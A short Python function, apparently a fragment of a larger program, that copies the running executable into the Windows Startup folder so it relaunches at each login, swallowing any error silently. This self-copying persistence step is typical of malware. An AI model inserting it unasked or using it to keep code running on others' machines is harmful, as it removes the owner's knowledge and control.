
def add_to_startup():
    """Add to Windows startup"""
    import os
    import shutil
    import sys
    
    try:
        startup_path = os.path.join(
            os.getenv("APPDATA"),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
            os.path.basename(sys.executable)
        )
        
        # Copy itself to startup
        shutil.copy(sys.executable, startup_path)
        return True
    except:
        return False
